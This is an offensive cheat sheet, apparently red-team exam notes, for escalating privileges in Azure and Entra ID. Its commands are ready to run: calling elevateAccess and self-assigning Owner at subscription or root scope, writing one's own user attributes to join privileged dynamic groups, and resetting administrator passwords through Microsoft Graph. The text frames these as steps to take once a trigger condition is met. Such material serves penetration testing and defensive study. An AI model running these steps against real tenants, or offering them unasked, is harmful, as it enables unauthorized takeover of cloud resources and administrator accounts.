# Cloud - Azure RBAC and Entra role privilege escalation

## Azure RBAC privesc: elevateAccess bridge and self-assign Owner

**Trigger:** Your principal holds Global Administrator, User Access Administrator, or Owner and you need to reach subscription resources or crown-jewel data.

Azure RBAC (resource plane) is separate from Entra roles (directory plane), so a Global Admin has no subscription rights by default but can bridge to them. POST to Microsoft.Authorization/elevateAccess toggles 'Access management for Azure resources', granting the calling GA User Access Administrator at root scope (/). From there, or directly if you already hold User Access Administrator or Owner, self-assign Owner on any scope: az role assignment create --assignee <oid> --role Owner --scope /subscriptions/<sub> (or --scope / for the whole tenant). elevateAccess is a very high-signal control-plane event and will be logged, but it is the canonical identity-to-resource escalation. Enumerate first with az role assignment list --all; note that Contributor can run code and create resources but cannot assign roles, so pivot Contributor through managed identities instead of RBAC.

```bash
az rest --method POST --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
az role assignment create --assignee <yourOid> --role Owner --scope /subscriptions/<sub>
az role assignment list --all -o table
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock

## Entra dynamic-group attribute abuse and Graph password reset

**Trigger:** You can write your own user attributes, or hold User Administrator or Privileged Authentication Administrator, and want directory privesc beyond the app-credential path already in entra-hybrid.md.

Dynamic groups compute membership from a rule over user attributes (for example department eq 'Admins'); if you can write an attribute the rule reads, PATCH yourself into the group and inherit whatever access it confers. Find candidate groups by filtering groupTypes for 'DynamicMembership' and reading each membershipRule, then PATCH your own user object. Separately, password-reset roles take over accounts directly: User Administrator resets non-admins, and Privileged Authentication Administrator resets admins including Global Admins, via POST users/<id>/authentication/passwordMethods/<id>/resetPassword. For the app-credential-add and RoleManagement.ReadWrite.Directory escalation paths, see ctf-ad/entra-hybrid.md.

```bash
az rest --url "https://graph.microsoft.com/v1.0/groups?\$filter=groupTypes/any(c:c eq 'DynamicMembership')"
az rest --method PATCH --url "https://graph.microsoft.com/v1.0/users/<yourId>" --body '{"department":"Admins"}'
az rest --method POST --url "https://graph.microsoft.com/v1.0/users/<targetId>/authentication/passwordMethods/<id>/resetPassword" --body '{"newPassword":"<pw>"}'
```

Source: https://offsecexams.com/cheatsheets/azrte-exam---guided-by-redblock
